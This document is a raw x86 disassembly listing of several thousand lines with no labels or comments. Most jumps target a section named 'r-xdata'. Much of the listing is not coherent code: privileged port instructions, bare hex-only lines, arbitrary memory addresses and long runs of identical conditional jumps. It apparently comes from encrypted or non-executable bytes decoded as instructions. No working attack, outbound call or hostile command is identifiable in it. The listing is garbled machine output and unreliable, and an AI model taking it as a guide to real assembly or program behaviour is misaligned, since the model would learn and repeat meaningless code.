jb r-xdata
jb r-xdata
mov cl 0x88
retn 0xb1b1
loop r-xdata
loop r-xdata
or dl ah
jb r-xdata
0xe2e07c0b 0x72e2
jb r-xdata
imul ebp [ edi + 0xb8b8824 ] 0xffffffe2
stc
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
fst [ 0x72721d1d ]
loopne r-xdata
jb r-xdata
or esi [ esi ]
clc
loop r-xdata
jb r-xdata
mov edi 0xe0050a12
loop r-xdata
cmc
loop r-xdata
and ch ch
0x88e2e2e2 0x1de2
sbb eax 0xb21d881d
jb r-xdata
imul ebx [ edi - 0x7be396ea ] 0x6b
lahf
jb r-xdata
jb r-xdata
mov edi 0xaf6b8450
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb bl [ 0x7272721d ]
sbb eax 0x37220baa
test [ ebx - 0x49 ] ch
mov eax 0x1d044d0b
loop r-xdata
jb r-xdata
mov eax 0x86b76b84
mov bh 0x80
jb r-xdata
jb r-xdata
fistp [ edi - 0x598120a ]
loop r-xdata
cli
loop r-xdata
popad
jb r-xdata
mov [ es : ebx + ecx + 0x1d1d3653 ] dh
lahf
loop r-xdata
xchg edi eax
adc dh [ ebp - 0x1d1b6bf5 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x1d04180b
sbb eax 0x56a72572
mov ecx 0xe2e067ed
jb r-xdata
sbb eax 0xb72721d
jb r-xdata
sbb eax 0x9367ede3
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
sbb ch [ ecx + 0x3c ]
test [ ebx - 0x41 ] ch
sbb [ ecx + 0x3a ] ch
or ebp ebp
inc edx
pop ds
sbb eax 0xb51db21d
mov dl 0xb1
sbb eax 0xe2e24e75
loop r-xdata
mov cl 0xb1
mov cl 0x6f
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d231e
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
in eax dx
jb r-xdata
test [ ebx - 0x61 ] ch
loop r-xdata
sub ebp ebp
jb r-xdata
loop r-xdata
sbb eax 0x4e741db2
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
cdq
and [ 0x180f0b1d ] ebx
push edi
xor bl [ edi ]
mov [ 0xbe088b2 ] bl
outsd
jb r-xdata
jb r-xdata
jb r-xdata
and [ 0x22d1721d ] ebx
or cl al
and al 0x1d
sbb eax 0xbee2661
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x2bd186b4
loop r-xdata
jecxz r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
outsd
jb r-xdata
popad
cdq
adc eax 0x7272213a
jb r-xdata
mov ah 0xea
popad
sbb bl [ 0x692377ed ]
mov dl 0x1d
mov ah 0x86
shr [ ebx ] 0x1
loop r-xdata
in eax dx
xchg ebx eax
in eax dx
mov [ edx + 0x1d05950b ] ah
jg r-xdata
and ebp [ ecx + 0x1b ]
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x32676f1d
pop ds
sbb eax 0x1db1b21d
mov ch 0xf6
imul edx [ edi + 0x32 ] 0x1f
out 0x19 al
in eax dx
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
test [ ebx - 0x49 ] ch
push es
mov eax 0x1d0fe50b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
push esi
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sub bl [ bx ]
sbb eax 0x950bbb72
cmp al 0x1d
sbb eax 0xd6941d72
or esp [ esi - 0x10 ]
mov [ 0x1d05950b ] al
test [ ebx - 0x69 ] ch
mov ch [ ecx - 0x69 ]
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
sub ebx [ 0x3b680b1d ]
sbb eax 0x7272721d
or ebp [ esi + 0x13 ]
sbb eax 0x7272721d
sub dh dh
sbb esp [ ecx + 0x1d ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
and al 0xb
push ds
and ebx [ 0x7272721d ]
jb r-xdata
aaa
jb r-xdata
jb r-xdata
sbb eax 0xa90bb694
add al 0x1d
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
out 0x19 al
jb r-xdata
jb r-xdata
sbb eax 0x370bb41d
jb r-xdata
jb r-xdata
sbb eax 0xb41db21d
xchg [ ecx + 0x2a ] ah
loopne r-xdata
pop ds
mov [ 0xffffffffb166ede2 ] al
pop ds
sbb eax 0x8ae2881d
adc edi edi
mov esp [ edx - 0x1d0523f5 ]
loop r-xdata
sbb eax 0x9961eab4
jb r-xdata
sub bl [ bx ]
sbb eax 0xb41db21d
outsd
push ebp
test [ ebx - 0xe ] ch
test [ edi + 0x30 ] ah
in eax dx
pop ds
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
or ebp [ esi ]
or ebx [ 0x7272721d ]
mov [ ebx - 0x40947b47 ] cl
push ss
imul edi [ 0x14bf6b84 ] 0x6b843a69
mov edi 0x843c691a
imul edi [ edi + 0xb3a6918 ] 0xffffffed
jb r-xdata
jb r-xdata
push ebp
not [ ebx + 0x1d21940b ]
sbb eax 0x72727272
jb r-xdata
jb r-xdata
sbb eax 0xa7611aa7
jb r-xdata
jb r-xdata
and ch ch
dec bx
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
xchg edi eax
push ss
or esp ebp
or eax 0x72721d1d
sbb al [ ebx + ebp * 2 - 0x5890f351 ]
and dl cl
sub esi [ ebx + ecx + 0x1d1d3c74 ]
jb r-xdata
and cl [ eax - 0x58947b0a ]
lodsb [ esi ]
cli
loop r-xdata
jb r-xdata
jb r-xdata
imul edx [ edi + 0x6ae468ea ] 0x30d1dbe6
imul esp [ ebx ] 0x1d5fa80b
sbb eax 0x35840a72
sbb eax 0x2267bb1d
in eax dx
jb r-xdata
mov ebp 0x6b84a088
lahf
push edx
mov ebp 0x509f6b84
sbb eax 0x1d3fe30b
sbb eax 0xd1727272
sbb eax 0x1e9f6b84
jb r-xdata
jb r-xdata
imul ebx [ edx ] 0xe2e3e68a
loop r-xdata
push ds
0xbbbb
push ebp
movsb [ edi ] [ esi ]
in al 0x1d
add ah dh
loop r-xdata
popad
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
sbb ah [ ecx - 0x59 ]
in eax dx
jb r-xdata
jb r-xdata
mov esp 0x3ca50aaa
sbb eax 0xd6a46b1d
jb r-xdata
loopne r-xdata
jb r-xdata
jb r-xdata
sbb ecx [ edx + 0x205260ed ]
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsb
adc ebx [ 0x7272721d ]
pop sp
imul esi edx 0xffffff84
xor ch ch
jb r-xdata
jb r-xdata
call 0xffffffffa70fa9c3
aaa
jb r-xdata
loop r-xdata
imul edi [ edx + ebp * 4 + 0x1d3ca50a ] 0x1d
imul esp [ esi + edx * 8 - 0x7cbbbf76 ] 0x9
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ esp + eax * 4 + 0xb06b76b ] cl
outsd
imul esp [ esi + edi * 8 + 0x1d35380a ] 0x1d
mov ch [ edi ]
jb r-xdata
sbb eax 0xb20ea76f
imul esp [ edx + ecx ] 0x1d1d35b0
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
rcr [ 0x1e9f6b84 ] 0x1
mov bh ch
or bl [ eax + 0x611d1d5d ]
out dx al
jb r-xdata
sbb cl [ edx - 0x1d1d1c1a ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
movsb [ edi ] fs : [ esi ]
mov ch 0x6b
movsb [ edi ] [ esi ]
retn 0xea0b
loopne r-xdata
dec [ edx ]
cmp [ 0x2f8a1d1d ] dh
jb r-xdata
sbb eax 0xe2e8130b
loop r-xdata
mov ch [ ebx - 0x4a83ce97 ]
imul esp [ edx + esi * 8 + 0x1d3ae50a ] 0x1d
mov dl 0x69
and al 0xa
mov al 0x35
sbb eax 0xd0bbb1d
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
sub esp [ ecx ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or esi [ ecx + 0x72e2e2e7 ]
cmpsd [ esi ] [ edi ]
or bh [ edx + 0x6b848c88 ]
scasd [ edi ]
out dx al
sbb eax 0x40b96b5
in al dx
jb r-xdata
jb r-xdata
imul esp [ edi - 0x184ef500 ] 0xffffffe2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
sub esp [ ecx ]
jb r-xdata
pop esi
loop r-xdata
xchg edi eax
out dx al
in eax dx
jb r-xdata
jb r-xdata
cmpsb [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
or ecx [ 0x72e2e2f0 ]
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
outsb
jb r-xdata
sbb eax 0xe2e24272
loop r-xdata
or esp [ esi - 0x3ce2e2ee ]
mov esi 0xfd0bf2c6
sbb eax 0x7272721d
sub esp [ edi + 0x22 ]
in eax dx
jb r-xdata
and [ edx + 0x72 ] esi
stosb [ edi ]
loop r-xdata
jb r-xdata
dec ebp
or dh [ 0xffffffffee8a1d1d ]
jb r-xdata
jb r-xdata
jb r-xdata
mov ch 0xb2
jb r-xdata
or ecx [ edi + 0x721d1d0d ]
jb r-xdata
lahf
jecxz r-xdata
push es
outsd
sbb eax 0x3fe30b1d
jb r-xdata
jb r-xdata
jecxz r-xdata
loop r-xdata
or esp esp
add bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
and [ ebx - 0x4b ] edx
sbb eax 0x4dee8a1d
jb r-xdata
adc dh [ edx + 0x1a340bb5 ]
jb r-xdata
sbb eax 0xe2e26e74
sub esp [ es : ecx ]
jb r-xdata
mov ebp 0xe2f2770b
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
or edx [ ebx ]
call 0x72b8ae10
jb r-xdata
sub al 0x30
or esp ebx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
test [ ebx + 0x7272721d ] dh
jb r-xdata
mov ebp 0x549f6b84
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0xe2f00d0b
cmpsd [ esi ] [ edi ]
sbb cl [ ebx ]
xor ecx [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov ch dh
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
mov ah dl
loop r-xdata
push ds
loope r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6e7745f0 ] 0xffffffbc
test [ ebx - 0x59 ] ch
push ss
mov [ esi + 0x2b0b2469 ] bh
ja r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
mov ah 0xb4
mov ah 0x6f
sbb eax 0x67ed7272
movsb [ edi ] [ esi ]
xchg edi eax
push ss
or eax [ esp + ebp * 8 ]
sbb eax 0x676fb11d
sub bl [ edi ]
sbb eax 0x676fb21d
push esi
sbb bl [ 0xffffffffb41db21d ]
0x676f
bound ebx [ edi + 0x67ede3f2 ]
sub al 0x30
aas
jb r-xdata
xchg edi eax
0xe66ae468 0xd1db
popad
jb r-xdata
jb r-xdata
jpo r-xdata
shr [ ebx ] 0x1
and ch ch
sbb eax 0x72727272
jb r-xdata
outsb
0x88e2e2e2 0x1de2
dec edx
push edx
jb r-xdata
jb r-xdata
mov [ edi - 0x60947b43 ] dl
pop esi
imul ebx [ ebx + ecx ] 0xe2e2ecb7
imul ebx [ edi - 0x425077ac ] 0xffffff84
imul ebx [ edi - 0x7be796a6 ] 0x6b
lahf
pop eax
arpl [ esi + ebx * 2 - 0x1e ] bx
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
mov [ es : 0xffffffff81821c8a ] al
lgs ebp [ ebx - 0x5c ]
test [ edx ] 0x14
xor eax 0x668a1d1d
cmpsd [ esi ] [ edi ]
or [ edx + 0x1d12ad0b ] bh
sbb eax 0x72727272
jb r-xdata
mov [ edi + 0xaa76b84 ] al
mov edx 0x6b848c88
jb r-xdata
outsd
jb r-xdata
jb r-xdata
outsd
loop r-xdata
mov [ 0xffffffffc6e66bfa ] al
and ch ch
imul esp [ edi + 0x1ea7691a ] 0xffffffd9
cmpsd [ esi ] [ edi ]
sbb ch ch
jpe r-xdata
jb r-xdata
mov ah 0x88
retn 0xb4b4
or esi [ edi - 0xe ]
jb r-xdata
into
sbb eax 0x10560a1d
jb r-xdata
mov dh 0x19
sbb eax 0x1db4b21d
loop r-xdata
jb r-xdata
and bl [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x36676fb2
pop ds
sbb eax 0x170ab21d
pop ecx
sbb eax 0xf226611d
sub esp [ ecx ]
outsd
out 0xe2 eax
enter 0x1d13 0x1d
jb r-xdata
jb r-xdata
loop r-xdata
std
mov ch ch
jb r-xdata
sbb eax 0x72727272
outsd
imul esp [ edi + 0x72212b1e ] 0x72727272
mov [ edi - 0x60947b43 ] ch
pop edx
imul ebx [ eax ] 0x589f6b84
test [ ebx - 0x61 ] ch
push esp
jb r-xdata
sbb eax 0xed1d671d
jb r-xdata
pushad
in eax dx
jb r-xdata
push ss
imul edi [ edi - 0x7bc396e6 ] 0x6b
mov edi 0xb3a6918
in eax dx
test [ ebx - 0x49 ] ch
jb r-xdata
jb r-xdata
push ebx
loop r-xdata
jb r-xdata
pop ds
sbb eax 0x106a0a1d
push edx
jb r-xdata
popad
fsub st2
or ecx eax
mov ah 0xb4
mov ah 0xb4
mov ah 0xb
jpo r-xdata
loop r-xdata
loop r-xdata
pop ds
jb r-xdata
imul esp esi 0x7221bbc6
jb r-xdata
imul esp esi 0xffffffc6
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xed22671d
or dl [ esi + 0x10 ]
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
out dx al
imul esp [ edi - 0x794de216 ] 0x1a612bd1
sbb eax 0xb2377ed
jns r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebx [ eax ] 0x6b849a88
lahf
push esi
test [ ebx - 0x61 ] ch
push eax
pop esp
or edi eax
sbb eax 0x204a67ed
jb r-xdata
jb r-xdata
loop r-xdata
mov bh 0x82
jb r-xdata
jb r-xdata
adc esi [ eax ]
sbb eax 0x7272721d
jb r-xdata
sbb [ ebp + ebx + 0x1d ] 0x72727272
jb r-xdata
sbb eax 0x107c0a1d
jb r-xdata
jb r-xdata
mov ah 0xb
sbb eax 0x9f6f721d
pop edx
outsd
outsd
push edx
pop ds
jb r-xdata
lahf
jb r-xdata
or edi ecx
out 0xe2 eax
loop r-xdata
sbb eax 0x1d107c0a
jb r-xdata
sub esp [ ecx ]
test [ ebx - 0x59 ] ch
adc [ edx - 0x7b436e78 ] bh
imul esp [ edi + 0x69be8816 ] 0x24
or ebp [ ebx ]
loop r-xdata
jb r-xdata
adc [ 0xffffffffed22671d ] bl
pop esp
sbb eax 0xd861841d
loop r-xdata
adc eax 0xe60bb51b
sub eax 0x72721d1d
in eax dx
movsb [ di ] [ si ]
jb r-xdata
jb r-xdata
sbb [ 0x1db4b21d ] ebx
sbb eax 0x7272721d
jb r-xdata
push esi
jb r-xdata
jb r-xdata
sbb [ 0x2267bb1d ] ebx
in eax dx
stosd [ di ]
pop ds
sbb eax 0x3420b1d
sbb eax 0x7272721d
test [ ebx - 0x59 ] ch
add al 0xba
or edx [ eax + 0x2d ]
sbb eax 0x66ed721d
0x8a1d1d3a 0xbbcd
pop es
jl r-xdata
mov ah 0xa
cwde
pop ebp
sbb eax 0xee26611d
and [ 0xffffffffed1d671d ] bl
jb r-xdata
in eax dx
and [ 0xfffffffff2a16f1d ] bl
dec edx
jb r-xdata
jb r-xdata
loop r-xdata
mov eax 0x6b848088
jb r-xdata
or cl [ eax + 0x6b84bd8f ]
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x67ed2267
hlt
or bh [ eax + edx + 0x1d ]
jb r-xdata
loop r-xdata
sbb eax 0x67ed2267
jb r-xdata
mov [ 0xffffffff881d1d5a ] ax
jb r-xdata
jb r-xdata
or cl [ esi ]
pop eax
sbb eax 0xee26611d
and ch ch
mov dl 0xb
shr [ ebx ] cl
sbb eax 0x7272721d
jl r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp [ edi - 0x1e ]
sbb eax 0x55edfeb5
movsb [ edi ] [ esi ]
in al 0xb
popfd
sub [ 0x7272721d ] bl
mov dl dl
imul ebp [ edx ] 0x72721d1d
jb r-xdata
sbb eax 0x67ed1d67
jb r-xdata
sbb eax 0xf2a16f1d
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov [ ebp - 0x58947b48 ] al
add [ ebx + ebp * 2 - 0x7b477f49 ] 0x6b
mov bh 0x86
jb r-xdata
sbb [ eax ] esi
jb r-xdata
jb r-xdata
lahf
jb r-xdata
or [ eax + 0x6b84bd8a ] cl
lahf
mov ebp 0xa9f6b84
jb r-xdata
jb r-xdata
jb r-xdata
hlt
adc [ 0xffffffffed22671d ] bl
jb r-xdata
and ch ch
jb r-xdata
pop esp
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop edx
sbb eax 0xba8d881d
jb r-xdata
jb r-xdata
sbb eax 0xed22671d
mov bh 0xb
mov [ 0x721d1d07 ] eax
adc ebx [ 0x7272721d ]
jb r-xdata
sbb esi [ ebp + 0x1d2de60b ]
sbb eax 0x72727272
loop r-xdata
jb r-xdata
push edx
sub ch [ edi + 0x6f ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xb51d0697
sbb eax 0x204a67ed
jb r-xdata
outsd
jb r-xdata
imul esi [ edi + 0x6b84b880 ] 0xffffffb7
fwait
sahf
sbb eax 0x7272721d
jb r-xdata
test [ ebx - 0x61 ] ch
jb r-xdata
mov [ edi - 0x60947b43 ] cl
jb r-xdata
imul ebx [ edi - 0x427077f6 ] 0xffffff84
imul ebx [ edi + 0x6b84bd00 ] 0xffffff9f
jb r-xdata
jb r-xdata
outsd
jb r-xdata
or esp [ ebx + 0x721d1d07 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x5c ] ch
sbb eax 0xb2bb5a1d
jb r-xdata
sbb eax 0xbba8d88
sbb al [ ebx + 0x7272721d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0x1ea7691e ] 0xffffffe1
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
or edi eax
jb r-xdata
or dh [ edx + 0xb1d1d36 ]
or esi [ ebx ]
or bl [ 0xffffffffb172721d ]
loop r-xdata
jb r-xdata
jb r-xdata
lahf
or dh cl
push cs
mov [ ebp + 0x1d18d60b ] al
sbb eax 0x72727272
jb r-xdata
mov ebp 0x89f6b84
mov [ edx - 0x60947b43 ] cl
jb r-xdata
jb r-xdata
or ebx [ ecx ]
jb r-xdata
add [ ebp + 0xa9f6b84 ] bh
jb r-xdata
jb r-xdata
mul [ es : edi + 0x22 ]
jb r-xdata
pop edx
jb r-xdata
pop sp
jb r-xdata
lea edi [ edx + 0x1d041a0b ]
jb r-xdata
sbb eax 0x25000b1d
lahf
jb r-xdata
jb r-xdata
into
jb r-xdata
sbb eax 0xed22671d
mov bx 0x1d32
sbb eax 0x130b22d1
nop [ 0x72727272 ] ebx
jb r-xdata
or ch [ edx + 0x10 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
clc
jb r-xdata
sbb eax 0x1d5bd90a
jb r-xdata
jb r-xdata
mov dl 0x36
sbb eax 0x30190b1d
test [ ebx - 0x49 ] ch
pop esp
mov eax 0x6b848d88
mov bh 0x22
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x6f
imul ebx [ edi - 0x427577f8 ] 0xffffff84
imul ebx [ edi + 0xb85880e ] 0xffffffd6
jb r-xdata
xor [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
loop r-xdata
mov dl 0xe2
jb r-xdata
pop esp
jb r-xdata
or ebx [ edx ]
jb r-xdata
mov ah 0xa
fldcw [ eax ]
loop r-xdata
outsd
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x2472721d
cmpsd [ esi ] [ edi ]
sbb eax 0xe7ce0ae2
loop r-xdata
mov dl 0xb5
or esi [ edx + ebx ]
imul esp edx 0x6bfaa269
out 0xc6 al
je r-xdata
sbb eax 0xbf2a16f
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
push 0xd1e2e2ec
loop r-xdata
sbb eax 0x1dee2661
jne r-xdata
fstp [ ebx + 0x1d ]
mov ch 0x6b
movsb [ edi ] [ esi ]
0x1d36e50a 0x8a1d
jb r-xdata
and cl [ ebx ]
mov eax 0x721d1d59
fldcw [ ecx ]
jb r-xdata
or edi [ eax + 0x721d1d59 ]
or bl [ esi + 0x61e2e2e1 ]
jb r-xdata
lahf
jb r-xdata
out 0x66 eax
loop r-xdata
cmp [ 0xffffffffc6a6691d ] ebx
sbb eax 0xe266e7d2
loop r-xdata
int1
sbb eax 0x72727272
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
and eax 0xe28813a7
mov dl ah
and eax 0xe28817a7
xor edi [ esi ]
jb r-xdata
loop r-xdata
or ebp [ edx ]
jb r-xdata
imul esp [ edx + ebp * 8 + 0xbf2a769 ] 0xffffff9d
loope r-xdata
loop r-xdata
jb r-xdata
sbb eax 0xe2b2bb5a
jb r-xdata
add al 0x1d
jb r-xdata
or eax [ ecx + 0x721d1d5c ]
xor [ edi ] 0x646b1d1d
push esi
loop r-xdata
mov ah 0xb4
or edi [ ebx + 0x11 ]
outsd
jb r-xdata
loop r-xdata
mov eax [ 0x38f80bf2 ]
jb r-xdata
jb r-xdata
jb r-xdata
adc esp [ esi + 0x30 ]
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov [ esi + 0xb8688ba ] bh
stosb [ edi ]
out 0xe2 eax
loop r-xdata
push ds
loop r-xdata
in eax dx
jne r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
in al dx
fwait
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
mov ebx 0x84e2e2b2
jb r-xdata
sbb eax 0xe6a46b1d
or dl [ esi - 0x75e2e2c9 ]
and [ ebp + 0x45 ] 0xd4
mov ch 0x6b
push edx
loop r-xdata
imul ebx [ esi + 0xab4f6c6 ] 0xffffffd9
imul esp [ esi + 0x1d37960a ] 0x1d
mov al [ edx - 0x4a2bba9b ]
imul esp [ edx + edx * 2 - 0x1e ] 0xffffffe2
or ch [ edi + 0x6f ]
jb r-xdata
mov ah 0xf6
or edx [ ecx + edx + 0xb721d1d ]
xor eax 0xffffffe2
loop r-xdata
loop r-xdata
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
xor ch ch
jb r-xdata
jb r-xdata
jb r-xdata
and esp eax
mov ch 0x69
sbb [ ecx + 0x18 ] ah
iretd
or al 0x29
sbb eax 0x7272721d
popad
xor al [ ebx + ebp * 2 - 0x7747a749 ]
xchg [ ebx + ebp * 2 - 0x7747a149 ] al
add [ ebx + ebp * 2 - 0x7747a349 ] 0x8d
test [ ebx - 0x49 ] ch
sbb eax 0x7272721d
fstp [ ecx ]
in eax dx
cmpsd [ esi ] [ edi ]
adc cl [ eax + 0xb216990 ]
and [ esi ] bl
loop r-xdata
or cl bl
push es
sbb eax 0xed21d91d
push 0xe2ec
jne r-xdata
jb r-xdata
sub [ 0x25000b1d ] bl
or bl cl
outsd
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fldenv [ ecx ]
in eax dx
jb r-xdata
0xbf2a769 0xe19d
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
jb r-xdata
sbb eax 0xea76f1d
jb r-xdata
shr [ esi ] cl
sub ecx [ ebx ]
jb r-xdata
popad
sbb bh cl
or esi [ ebx + 0x5 ]
sbb eax 0x88ba721d
xchg [ ecx + 0x12a76b84 ] edi
or ecx [ ecx + 0x1d1d1d2a ]
cmc
or edi [ eax + 0x721d1d5f ]
jb r-xdata
mov [ ebx + 0x6a76b84 ] ch
jb r-xdata
jb r-xdata
mov cl 0x61
mov [ eax + 0x200b2169 ] dl
sbb eax 0x8788ba72
mov ecx 0x12a76b84
adc al 0xd9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x1bd5f4e2 ] 0xffffffe2
stosb [ edi ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
outsd
jb r-xdata
loop r-xdata
jb r-xdata
push es
test [ ebx - 0x59 ] ch
jb r-xdata
sbb cl cl
jb r-xdata
or ecx [ edi + ecx + 0x72721d1d ]
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
fcom [ esi ]
sbb eax 0xd5da8a1d
mov dl ah
test [ 0x321d1ba7 ] ah
cmpsd [ esi ] [ edi ]
adc ecx [ eax + 0x25e288e2 ]
or ecx [ ecx + 0x72e2e2e9 ]
jb r-xdata
sbb eax 0xdcd5da8a
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
sub ecx [ bp + di ]
movsb [ edi ] [ esi ]
jb r-xdata
push cs
test [ ebx - 0x59 ] ch
add [ ebx ] cl
mov cl 0xe7
loop r-xdata
outsb
pop ecx
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x72727272
imul esi [ edi - 0x6e7747c4 ] 0xffffff84
imul esi [ edi - 0x7bcc96fe ] 0x6b
mov bh 0x0
imul esp [ esi + ecx - 0x1e ] 0xffffffe2
sbb eax 0xb172721d
popad
jb r-xdata
sbb eax 0x25727272
jb r-xdata
loop r-xdata
jb r-xdata
fcmovbe st5
jb r-xdata
jb r-xdata
imul esp [ edi - 0x1e62f40e ] 0x7272e2e2
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ ebx + ebp * 2 - 0x7745f359 ] eax
mov [ ecx + 0x2a ] gs
jb r-xdata
xor eax [ ebx + ebp * 2 - 0x64f4ff49 ]
aas
sbb eax 0x751d721d
dec edx
loop r-xdata
push 0xe654edf3
in al dx
jb r-xdata
mov edx 0x6b84ab88
lahf
sbb cl [ ebx ]
neg [ ecx + 0x1d ]
and cl [ ebx ]
pop ss
jecxz r-xdata
mul [ edi + 0x22 ]
jb r-xdata
sbb [ 0x7272721d ] bl
jb r-xdata
and ebp ebp
jb r-xdata
and [ ebx ] ecx
rcl [ ecx + ebx * 8 ] 0x1
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ eax + 0x721d1d2a ]
jb r-xdata
loop r-xdata
jb r-xdata
or ebx [ ebp + 0x72e2e2e1 ]
jb r-xdata
or eax 0x72e2e2f0
jb r-xdata
or dl [ edi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
imul esp [ edi - 0x737745f4 ] 0x69
sub cl [ ebx ]
dec eax
pop esp
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
push esp
in eax dx
push esp
jb r-xdata
or ebx [ ebx + 0x721d1d3f ]
sbb eax 0xe2e24a75
mov [ ecx + 0x2b76b84 ] dl
imul esi [ ebx ] 0xb76b84
loop r-xdata
and ch ch
jb r-xdata
jb r-xdata
jge r-xdata
sbb ebp ebp
fldenv [ ecx ]
jb r-xdata
loop r-xdata
mov ah 0xea
mov [ esi - 0x5990e22f ] ah
sub bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edx + 0x2aa00be6 ] 0x72721d1d
jb r-xdata
pop ecx
sub [ 0x7272721d ] bl
jb r-xdata
sub ecx [ ebx ]
loop r-xdata
jb r-xdata
sbb eax 0xa66fbb1d
jb r-xdata
or al 0xba
jb r-xdata
and eax 0x1d0466ed
sbb eax 0x67bcbd1d
leave
test [ ebx - 0x49 ] ch
cmp al 0xb8
out 0xec al
jb r-xdata
0x1d1e971d 0x697
jb r-xdata
jb r-xdata
or ebx eax
jb r-xdata
0x1dd1a688 0xa66f
sbb eax 0x72727272
jb r-xdata
jb r-xdata
or bl cl
pop ebx
sbb eax 0xee26611d
sbb eax 0xe2e24a75
jb r-xdata
push ss
mov bl dl
jb r-xdata
pop edx
test [ 0x67bb1d1d ] dh
and ch ch
jb r-xdata
jb r-xdata
sbb eax 0xc6a66fbb
fimul [ ebx ]
retn
jb r-xdata
mov [ ecx + ebp * 2 + 0x5c480b2a ] cl
in eax dx
xchg edi eax
push ds
jb r-xdata
jb r-xdata
adc eax 0x72721d1d
jb r-xdata
aad 0xdc
jb r-xdata
jb r-xdata
in al dx
jb r-xdata
push cs
loop r-xdata
imul esp [ edx + ebx * 4 + 0x1d36e50a ] 0x1d
cdq
cld
aaa
mov ch 0x6b
stosd [ edi ]
imul esi [ ecx ] 0xa46bb57c
or ah ch
cmp bl [ 0xffffffffa226611d ]
mov bl [ edx + eax * 4 ]
imul esp [ edi + 0x8330b1a ] 0x72721d1d
jb r-xdata
outsd
cmpsb [ esi ] [ edi ]
jb r-xdata
